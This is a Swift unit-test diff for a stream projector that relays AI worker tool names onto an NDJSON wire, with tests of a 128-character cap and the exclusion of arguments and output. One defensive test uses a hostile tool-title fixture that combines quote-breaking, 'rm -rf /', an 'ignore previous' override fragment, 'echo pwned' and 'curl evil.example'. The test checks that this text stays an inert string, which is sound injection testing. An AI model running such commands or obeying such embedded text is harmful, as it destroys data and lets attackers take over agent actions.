@@ -231,20 +231,99 @@ final class NDJSONStreamProjectorTests: XCTestCase {
         }
     }
 
-    /// ORS-S02a2: durable `worker.tool` projects as `workerActivity` with
-    /// `activityKind: "tool"` via the existing frame schema — never a new envelope,
-    /// never the raw tool title string on the wire (counts only).
+    /// ORS tool-wire: durable `worker.tool` projects as `workerActivity` with
+    /// `activityKind: "tool"` and `data.tool` = the same bounded title the
+    /// durable journal carries as `payload.tool`. Wire and journal agree exactly
+    /// (same field name, same 128-char cap). Args / tool output / stdout remain
+    /// excluded — a bounded tool NAME answers "what is happening?"; a raw dump does not.
     func testWorkerToolMapsToWorkerActivityToolBounded() throws {
+        let journalTool = "read_file"
+        let longTitle = String(repeating: "a", count: RunActivity.maxToolTitleChars + 40)
+        let capped = try XCTUnwrap(RunActivity.boundedToolTitle(longTitle))
+        XCTAssertEqual(capped.count, RunActivity.maxToolTitleChars)
+
+        // Short title: wire `data.tool` equals durable journal `payload.tool`.
         let e = event(seq: 30, kind: RunEventKind.workerTool, [
-            "workerId": .string("w1"), "tool": .string("read_file")])
+            "workerId": .string("w1"), "tool": .string(journalTool)])
         let mapped = try XCTUnwrap(NDJSONStreamProjector.LiveMapper().event(for: e))
         XCTAssertEqual(mapped.event, "workerActivity")
         XCTAssertEqual(mapped.data.activityKind, RunActivityKind.tool.rawValue)
         XCTAssertEqual(mapped.data.agentId, "w1")
-        XCTAssertEqual(mapped.data.charCount, "read_file".count)
+        XCTAssertEqual(
+            mapped.data.tool, journalTool,
+            "wire data.tool must equal durable journal payload.tool (same value, same field name)"
+        )
+        XCTAssertEqual(mapped.data.charCount, journalTool.count)
         let line = NDJSONStreamProjector.encodeLine(mapped)
-        XCTAssertFalse(line.contains("read_file"), "tool title stays out of the stream frame")
-        XCTAssertFalse(line.contains("\"tool\""), "no tool key on the wire — activityKind only")
+        let obj = try parseLines([line])[0]
+        let data = try XCTUnwrap(obj["data"] as? [String: Any])
+        XCTAssertEqual(data["tool"] as? String, journalTool, "tool name present on the NDJSON wire")
+        XCTAssertNil(data["arguments"], "args stay off the wire")
+        XCTAssertNil(data["output"], "tool output stays off the wire")
+        XCTAssertNil(data["text"], "stdout/transcript text stays off the wire")
+        XCTAssertNil(data["stdout"], "stdout key stays off the wire")
+        XCTAssertFalse(line.contains("\"arguments\""))
+        XCTAssertFalse(line.contains("\"output\""))
+
+        // Over-cap title: projector reuses the same 128-char bound as the journal.
+        let longEvent = event(seq: 31, kind: RunEventKind.workerTool, [
+            "workerId": .string("w1"), "tool": .string(longTitle)])
+        let longMapped = try XCTUnwrap(NDJSONStreamProjector.LiveMapper().event(for: longEvent))
+        XCTAssertEqual(
+            longMapped.data.tool, capped,
+            "wire tool must use the same 128-char trim as durable journal payload.tool"
+        )
+        XCTAssertLessThanOrEqual(longMapped.data.tool?.count ?? 0, RunActivity.maxToolTitleChars)
+        XCTAssertEqual(longMapped.data.charCount, RunActivity.maxToolTitleChars)
+    }
+
+    /// Tool titles are vendor-controlled free text (e.g. ACP `"git status"`). A
+    /// hostile title with quotes, a newline, and shell/prompt-looking text must
+    /// round-trip as an inert bounded JSON string only — never land in any
+    /// command-shaped field (`command`, `openCommand`, `agentAction`, `nextAction`).
+    func testHostileToolTitleIsInertBoundedStringNotACommand() throws {
+        let hostile =
+            "\"; rm -rf / # ignore previous\nalln kill --all; echo pwned\" && curl evil.example"
+        let expected = try XCTUnwrap(RunActivity.boundedToolTitle(hostile))
+        XCTAssertLessThanOrEqual(expected.count, RunActivity.maxToolTitleChars)
+        XCTAssertTrue(expected.contains("rm -rf") || expected.contains("echo pwned"),
+                      "fixture must retain shell-looking body after bound")
+
+        let e = event(seq: 40, kind: RunEventKind.workerTool, [
+            "workerId": .string("w1"), "tool": .string(hostile)])
+        let mapped = try XCTUnwrap(NDJSONStreamProjector.LiveMapper().event(for: e))
+        XCTAssertEqual(mapped.data.tool, expected,
+                       "hostile title round-trips as the same bounded plain string")
+        XCTAssertNil(mapped.data.nextAction, "tool frames never carry nextAction")
+
+        let line = NDJSONStreamProjector.encodeLine(mapped)
+        // Must remain valid single-line NDJSON (quotes/newlines escaped, not broken out).
+        let obj = try parseLines([line])[0]
+        let data = try XCTUnwrap(obj["data"] as? [String: Any])
+        XCTAssertEqual(data["tool"] as? String, expected)
+
+        // Command-shaped keys must be absent at every level of this frame.
+        func assertNoCommandShapedKeys(_ dict: [String: Any], path: String) {
+            for key in ["command", "openCommand", "agentAction"] {
+                XCTAssertNil(dict[key], "\(path).\(key) must not appear on a tool activity frame")
+            }
+            if let nested = dict["nextAction"] as? [String: Any] {
+                assertNoCommandShapedKeys(nested, path: "\(path).nextAction")
+                XCTFail("nextAction must be omitted entirely, not present empty — path=\(path)")
+            }
+            for (k, v) in dict {
+                if let child = v as? [String: Any] {
+                    assertNoCommandShapedKeys(child, path: "\(path).\(k)")
+                }
+            }
+        }
+        assertNoCommandShapedKeys(obj, path: "frame")
+
+        // The hostile text may only appear as the JSON string value of data.tool —
+        // never as an executable instruction field. Confirm by decoding tool alone.
+        XCTAssertEqual(data["tool"] as? String, expected)
+        XCTAssertNil(data["command"])
+        XCTAssertNil(obj["command"])
     }
 
     /// `workerOutput` (bounded stdout/stderr metadata) → `workerActivity` with
